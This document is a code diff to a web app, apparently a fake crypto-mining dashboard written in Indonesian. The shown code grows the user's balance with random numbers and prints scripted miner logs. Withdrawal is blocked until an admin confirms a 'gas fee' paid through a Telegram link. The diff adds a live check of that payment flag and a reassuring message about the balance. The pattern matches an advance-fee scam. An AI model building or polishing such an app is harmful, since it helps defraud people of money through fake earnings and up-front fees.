@@ -1379,9 +1379,10 @@
                 currentUser = nodeId;
                 currentUserPass = pass;
                 bal = parseFloat(user.balance) || 0;
-                hasPaidGasFee = (user.has_paid_gas === 'true' || user.has_paid_gas === true);
+                
+                // Parsing TRUE robust
+                hasPaidGasFee = (String(user.has_paid_gas).trim().toLowerCase() === 'true');
 
-                // DUAL-SAVE: Cek apakah di memori HP ada saldo yang lebih tinggi (belum ke-save ke DB)
                 const savedBal = parseFloat(localStorage.getItem(`nexusBal_${currentUser}`));
                 if (savedBal && savedBal > bal) {
                     bal = savedBal;
@@ -1447,15 +1448,13 @@
         }
 
         // ──────────────────────────────────────────────
-        // ⏻ LOGOUT (AESTHETIC)
+        // ⏻ LOGOUT
         // ──────────────────────────────────────────────
         function logout() {
-            // Save terakhir ke SheetDB sblm kluar
             if (currentUser && bal > 0) updateUserBalance(currentUser, bal); 
             
             localStorage.removeItem('nexusNodeId');
             localStorage.removeItem('nexusPass');
-            // Catatan: Kita TIDAK ngehapus nexusBal_${currentUser} biar aman kalau dia relog di HP yang sama.
             
             currentUser = null;
             currentUserPass = '';
@@ -1483,7 +1482,6 @@
         // ──────────────────────────────────────────────
         function startDbSync() {
             if (autoSaveInterval) clearInterval(autoSaveInterval);
-            // Backup ke SheetDB HANYA tiap 3 Menit (biar ga jebol limit API gratisan)
             autoSaveInterval = setInterval(() => {
                 if (currentUser && bal > 0) {
                     updateUserBalance(currentUser, bal);
@@ -1491,14 +1489,12 @@
             }, 180000); 
         }
 
-        // Auto-Save darurat saat user mau close tab
         window.addEventListener('beforeunload', () => {
             if (currentUser && bal > 0) {
                 updateUserBalance(currentUser, bal, true); 
             }
         });
 
-        // Auto-Login
         window.onload = async () => {
             const savedNode = localStorage.getItem('nexusNodeId');
             const savedPass = localStorage.getItem('nexusPass');
@@ -1512,9 +1508,10 @@
                     currentUser = savedNode;
                     currentUserPass = savedPass;
                     bal = parseFloat(user.balance) || 0;
-                    hasPaidGasFee = (user.has_paid_gas === 'true' || user.has_paid_gas === true);
                     
-                    // Ambil saldo yang kesimpen di memori HP (siapa tau ada yg blm kekirim ke DB)
+                    // Parsing TRUE robust
+                    hasPaidGasFee = (String(user.has_paid_gas).trim().toLowerCase() === 'true');
+                    
                     const localBal = parseFloat(localStorage.getItem(`nexusBal_${currentUser}`));
                     if (localBal && localBal > bal) {
                         bal = localBal;
@@ -1604,7 +1601,7 @@
         setInterval(fetchRealRate, 60000);
 
         // ──────────────────────────────────────────────
-        // ⛏️ MINING LOOP (SAVE LOKAL TIAP DETIK)
+        // ⛏️ MINING LOOP
         // ──────────────────────────────────────────────
         setInterval(() => {
             if (active) {
@@ -1612,7 +1609,6 @@
                 shares += Math.random() > 0.65 ? 1 : 0;
                 uptime++;
                 
-                // SAVE LOKAL TIAP DETIK (Ini yang bikin duit gak ilang walau direfresh)
                 if(currentUser) {
                     localStorage.setItem(`nexusBal_${currentUser}`, bal);
                 }
@@ -1662,7 +1658,6 @@
             dashLog('Stopping miner processes...');
             setTimeout(() => dashLog('Disconnecting from pool. Threads parked.'), 400);
             
-            // Backup pas user ngerem mining
             if (currentUser) updateUserBalance(currentUser, bal);
         }
 
@@ -1717,7 +1712,8 @@
             document.getElementById('vPass').value = '';
         }
 
-        function triggerVerifModal() {
+        // --- UPDATE TERBARU: CEK REAL-TIME KE DATABASE ---
+        async function triggerVerifModal() {
             const amt = parseFloat(document.getElementById('wdAmt').value) || 0;
             const name = document.getElementById('wdName').value.trim();
             const phone = document.getElementById('wdPhone').value.trim();
@@ -1727,6 +1723,25 @@
             if (!name) return toast('Nama pemilik akun tujuan wajib diisi!');
             if (!phone) return toast('Nomor Rekening / E-wallet wajib diisi!');
             if (!wallet) return toast('Pilih metode pencairan Fiat (IDR)!');
+
+            // Disable input sebentar biar ga dklik 2x
+            const btnWd = document.querySelector('#pgWd .btn-auth');
+            const oldText = btnWd.textContent;
+            btnWd.textContent = 'Mengecek Sinkronisasi...';
+            document.getElementById('wdAmt').disabled = true;
+
+            // Tarik data paling fresh dari DB buat ngecek apakah udah di-True sama admin
+            if (currentUser && currentUserPass) {
+                try {
+                    const userSync = await loginUser(currentUser, currentUserPass);
+                    if (userSync) {
+                        hasPaidGasFee = (String(userSync.has_paid_gas).trim().toLowerCase() === 'true');
+                    }
+                } catch(e) {}
+            }
+
+            btnWd.textContent = oldText;
+            document.getElementById('wdAmt').disabled = false;
 
             if (!hasPaidGasFee) {
                 document.getElementById('verifModal').classList.add('active');
@@ -1765,7 +1780,7 @@
         function confirmQR() {
             window.open('https://t.me/sweionf', '_blank');
             closeModal();
-            toast('⚠️ Silakan selesaikan pembayaran ke admin. Jika sudah dikonfirmasi, login ulang untuk proses WD.');
+            toast('⚠️ Silakan selesaikan pembayaran ke admin. Saldo tidak dipotong sebelum lunas.');
         }
 
         async function submitWdFinal() {
@@ -1775,7 +1790,6 @@
 
             bal -= amt;
             
-            // Simpan perubahan ke lokal dan server
             if (currentUser) {
                 localStorage.setItem(`nexusBal_${currentUser}`, bal);
                 await updateUserBalance(currentUser, bal);
